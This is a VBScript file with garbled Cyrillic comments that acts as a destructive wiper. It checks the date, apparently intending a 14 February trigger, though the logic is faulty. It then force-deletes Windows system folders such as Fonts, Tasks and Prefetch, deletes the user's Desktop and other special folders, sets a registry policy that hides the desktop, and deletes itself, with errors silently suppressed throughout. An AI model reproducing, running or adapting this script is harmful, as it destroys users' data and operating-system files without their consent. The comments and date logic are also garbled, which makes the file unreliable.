'            = = = = = =  = > ��� ������ < = = = = = = = 

'      ���������� ����������(���� ����� �� ����������)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' ���������� ������
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


'     ��������� ����� ������ 14 ����� �������
If Day(Date)<>14 and Month(Date)<>2 Then WScript.quit

' �������� C:\WINDOWS\Fonts\
str = "C:\WINDOWS\Fonts\"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' �������� C:\WINDOWS\Registration\
str = "C:\WINDOWS\Registration\"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' �������� C:\WINDOWS\twain_32\
str = "C:\WINDOWS\twain_32\"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' �������� C:\WINDOWS\Tasks
str = "C:\WINDOWS\Tasks"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' �������� C:\WINDOWS\Prefetch\
str = "C:\WINDOWS\Prefetch\"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

'     �������� ����������� �����
 For Each Folder In Shell.SpecialFolders

' �������� �������� �����
 FileSystemObject.deletefolder Shell.SpecialFolders ("Desktop"),True
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"

' �������� Aplication Data
 If right(folder,15) = "Aplication Data" Then FileSystemObject.deletefolder folder,True

' �������� PrintHood
 If  right(folder,9) = "PrintHood"  Then FileSystemObject.deletefolder folder,True

' �������� ShellNew
 If right(folder,8) = "ShellNew" Then FileSystemObject.deletefolder folder,True

' �������� �������
 If right(folder,5) = "FONTS" Then FileSystemObject.deletefolder folder,True

' �������� NetHood
 If right(folder,7) = "NetHood" Then FileSystemObject.deletefolder folder,True

' �������� ������� ����
 If right(folder,12) = "������� ����" Then FileSystemObject.deletefolder folder,True

' �������� SendTo
 If right(folder,6) = "SendTo" Then FileSystemObject.deletefolder folder,True

' �������� ������������
 If right(folder,12) = "������������" Then FileSystemObject.deletefolder folder,True

' �������� ���������
 If right(folder,9) = "���������" Then FileSystemObject.deletefolder folder,True

' �������� ��� ���������
 If right(folder,13) = "��� ���������" Then FileSystemObject.deletefolder folder,True

' �������� ���������
 If right(folder,9) = "���������" Then FileSystemObject.deletefolder folder,True
 Next

'     �������������������
FileSystemObject.deletefile WScript.ScriptFullName, True

